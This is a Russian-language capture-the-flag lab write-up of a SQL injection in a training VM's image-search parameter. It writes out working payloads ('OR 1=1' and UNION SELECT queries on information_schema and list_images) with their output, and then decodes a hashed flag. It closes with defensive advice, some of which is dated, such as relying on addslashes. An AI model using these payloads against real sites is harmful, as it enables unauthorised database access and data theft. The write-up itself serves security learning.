Уязвимость поисковой строки

SQL инъекция — это один из самых доступных способов взлома сайта.
Суть таких инъекций – внедрение в данные (передаваемые через GET, POST запросы или значения Cookie) произвольного SQL кода. 
Если сайт уязвим и выполняет такие инъекции, то по сути есть возможность творить с БД (чаще всего это MySQL) что угодно.

Когда вводишь что-то неизвестное, сбрасывает страницу.
А когда вводишь цифры, то на каждую отвечает определенной ссылкой на изображение.
https://habr.com/ru/post/130826/ В статье описано какие тесты можно проводить, а когда вводим +, то он воспринимается как пробел в SQL

При вводе 4+OR+1=1 выводит все находящиеся ссылки внутри.
http://192.168.56.101/?page=searchimg&id=4+OR+1=1&Submit=Submit#
Что говорит об уязвимости поисковика.
Осталось узнать что подразумевается под:
Title: Hack me ?
Url : borntosec.ddns.net/images.png

Судя по ответу можно понять, что делается следующий запрос:
SELECT ID, Title, Url WHERE 'table'

Чтобы выполнять и собственные запросы, есть функция UNION.
Оператор языка SQL UNION предназначен для объединения результирующих таблиц базы данных, полученных с применением слова SELECT. 
Условие объединения результирующих таблиц: совпадение числа, порядка следования и типа данных столбцов.

Реация на ковычи:
1. Скрипт не реагирует на ковычки с цифрами, что говорит о проверке числовое
2. Скрипт не реагирует на ковычки со строками, что говорит о защите от символов

В процессе проверок мы узнали, что используется MySQL.
А в MySQL есть такое понятие как INFORMATION_SCHEMA.
INFORMATION_SCHEMA обеспечивает доступ к метаданным о базе данных, информации о 
сервере MySQL, такой как название базы данных или таблицы, типе данных столбца или привилегиях доступа. 
Что хранится в information_schema? https://chartio.com/learn/databases/using-information-schema-views-to-check-to-see-if-table-exists-in-sql-server/

Как узнать название таблиц и и колонок в них?
Задаем запрос на первый индекс, затем объединяем с запросом вывода имён таблиц и вывода имен колонок таблиц из информации о схемах
1 UNION SELECT table_name, column_name FROM information_schema.columns
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: id
Url : list_images
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: url
Url : list_images
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: title
Url : list_images
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: comment
Url : list_images

Так мы видим, что есть таблица list_images, где есть колонки id, url, title, comment.
Теперь можно сделать запрос на таблицу list_images.
Т.к. выводится изначально в первом запросе по 2 столбца, то нам надо выводить через второй запрос тоже
по два столбца. Мы выбрали по два столбца снизу из таблицы list_images.
1 UNION SELECT comment, title FROM list_images

Нашли строку: Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Decrypt даёт нам значение albatroz (https://md5decrypt.net/en/)
Дальше шифруем его через sha256: 
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 (https://md5decrypt.net/en/Sha256/#answer)

Как защититься?
Защита от взлома сводится к базовому правилу «доверяй, но проверяй». Проверять нужно всё – числа, строки, даты, 
данные в специальных форматах.

Числа

Для проверки переменной на числовое значение используется функция is_numeric(n);, 
которая вернёт true, если параметр n — число, и false в противном случае.
Так же можно не проверять значение на число, а вручную переопределить тип. Вот пример, переопределяющий значение $id,
полученное от $_GET['id_news'] в значение целочисленного типа (в целое число):
$id=(int)$_GET['id_news'];

Строки

Большинство взломов через SQL происходят по причине нахождения в строках «необезвреженных» кавычек, апострофов и других специальных
символов. Для такого обезвреживания нужно использовать функцию addslashes($str);, которая возвращает строку $str
с добавленным обратным слешем (\) перед каждым специальным символом. Данный процесс называется экранизацией.
А также на наличие подзапросов, как-то показывает UNION и второй SELECT, который вводится пользователем.
